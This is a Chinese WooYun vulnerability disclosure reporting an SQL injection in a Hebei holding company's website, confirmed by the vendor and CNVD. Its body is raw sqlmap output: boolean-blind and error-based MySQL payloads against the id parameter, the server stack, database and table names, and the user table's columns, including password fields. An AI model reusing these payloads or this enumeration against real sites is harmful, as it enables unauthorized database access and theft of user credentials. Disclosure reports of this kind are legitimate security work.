wybug_title: 恒热控股集团存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-11-26：	细节已通知厂商并且等待厂商处理中									2015-11-30：	厂商已经确认，细节仅向厂商公开									2015-12-10：	细节向核心白帽子及相关领域专家公开									2015-12-20：	细节向普通白帽子公开									2015-12-30：	细节向实习白帽子公开									2016-01-14：	细节向公众公开  简要描述： 恒热控股集团主页存在SQL注入漏洞，可登陆后台 详细说明：  恒热控股集团历经24年的发展，业务范围涵盖建安业、地产业、制造业、综合服务业等四大主营板块的大型企业集团。恒热集团注册资本总额4.585亿元，有8家子公司，5家分公司，综合实力强大，是河北省知名企业，是开发区“纳税大户”企业.注入点：http://**.**.**.**/news_show.php?id=22
sqlmap identified the following injection point(s) with a total of 215 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=22 AND 8009=8009    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=22 AND (SELECT 9647 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(9647=9647,1))),0x7162716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---web server operating system: Windows 2003 or XPweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 6.0back-end DBMS: MySQL 5.0sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=22 AND 8009=8009    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=22 AND (SELECT 9647 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(9647=9647,1))),0x7162716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---web server operating system: Windows 2003 or XPweb application technology: PHP 5.2.6, ASP.NET, Microsoft IIS 6.0back-end DBMS: MySQL 5.0available databases [3]:[*] hengre[*] information_schema[*] jy_db

Database: hengre[21 tables]+-----------------+| x_about         || x_adminlog      || x_contact       || x_hr            || x_hr_apply      || x_hr_info       || x_hr_table      || x_industry      || x_industry_sort || x_link          || x_loginlog      || x_news          || x_news_sort     || x_pic           || x_pic_sort      || x_site          || x_txt           || x_user          || x_user_groups   || x_video         || x_video_sort    |+-----------------+Table: x_user[16 columns]+------------+| Column     |+------------+| addtime    || birthday   || edittime   || email      || nickname   || parentid   || password   || phone      || Remarks    || replyNum   || state      || subid      || ugid       || userid     || username   || x_password |+------------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-30 10:48 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河北分中心，由河北分中心后续协调网站管理单位处置。 最新状态： 暂无
